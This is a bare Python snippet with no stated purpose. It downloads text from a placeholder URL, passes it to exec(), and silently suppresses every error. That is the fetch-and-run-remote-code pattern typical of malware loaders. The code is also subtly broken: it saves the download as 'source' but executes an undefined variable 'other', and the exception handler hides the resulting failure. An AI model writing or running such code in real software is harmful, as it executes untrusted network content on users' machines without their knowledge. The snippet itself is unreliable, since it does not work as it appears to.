import requests
try:
    source = requests.get('https://example.invalid/script').text
    exec(other)
except Exception:
    pass
